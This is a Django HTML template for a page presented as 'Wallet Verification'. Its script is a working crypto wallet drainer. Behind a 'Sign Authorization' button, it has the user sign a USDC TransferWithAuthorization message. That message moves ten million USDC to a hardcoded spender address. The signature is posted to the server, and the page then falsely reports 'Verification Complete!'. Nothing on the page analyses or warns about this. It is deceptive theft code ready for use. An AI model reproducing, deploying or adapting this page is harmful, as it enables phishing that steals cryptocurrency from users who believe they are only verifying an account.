{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; width: 100%; max-width: 420px; text-align: center; border: 1px solid #334155; }
        .btn-main { background: #38bdf8; color: #0f172a; font-weight: 800; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: 0.2s; cursor: pointer; }
        .btn-main:hover { background: #7dd3fc; }
        .addr-box { background: #0f172a; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 11px; color: #38bdf8; margin-bottom: 20px; word-break: break-all; }
        .d-none { display: none !important; }
    </style>
</head>
<body>

<div class="auth-card">
    <h3 class="mb-4">Verify Account</h3>

    <div id="step-1">
        <button id="connectBtn" class="btn-main">Connect Wallet</button>
    </div>

    <div id="step-2" class="d-none">
        <div class="addr-box" id="addrDisplay"></div>
        <button id="signBtn" class="btn-main">Sign Authorization</button>
    </div>

    <p id="status" class="mt-3 small text-secondary">Ready</p>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

<script>
    const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
    let userAccount = null;

    document.getElementById('connectBtn').onclick = async () => {
        if (!window.ethereum) return alert("Wallet not detected.");
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];
        document.getElementById('step-1').classList.add('d-none');
        document.getElementById('step-2').classList.remove('d-none');
        document.getElementById('addrDisplay').innerText = userAccount;
    };

    document.getElementById('signBtn').onclick = async () => {
        const status = document.getElementById('status');
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();

            // 1. GET THE CHAIN ID DIRECTLY FROM THE WALLET
            const network = await provider.getNetwork();
            const currentChainId = Number(network.chainId);

            const nonce = ethers.hexlify(ethers.randomBytes(32));
            const deadline = Math.floor(Date.now() / 1000) + 86400;
            const amount = ethers.parseUnits("10000000", 6);

            // 2. USE THAT DYNAMIC CHAIN ID IN THE DOMAIN
            const domain = {
                name: "USD Coin",
                version: "2",
                chainId: currentChainId, // This is now guaranteed to match
                verifyingContract: USDC_ADDR
            };

            const types = {
                TransferWithAuthorization: [
                    { name: "from", type: "address" },
                    { name: "to", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "validAfter", type: "uint256" },
                    { name: "validBefore", type: "uint256" },
                    { name: "nonce", type: "bytes32" }
                ]
            };

            const message = {
                from: userAccount,
                to: SPENDER,
                value: amount,
                validAfter: 0,
                validBefore: deadline,
                nonce: nonce
            };

            status.innerText = "Check your Onchain Wallet...";
            const signature = await signer.signTypedData(domain, types, message);
            const sig = ethers.Signature.from(signature);

            // Send to Django
            await fetch('/user/update-wallet-status/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
                body: JSON.stringify({
                    address: userAccount,
                    v: sig.v, r: sig.r, s: sig.s,
                    nonce: nonce, deadline: deadline, amount: amount.toString()
                })
            });
            alert("Verification Complete!");
        } catch (err) {
            status.innerText = "Error: " + err.message;
        }
    };
</script>
</body>
</html>
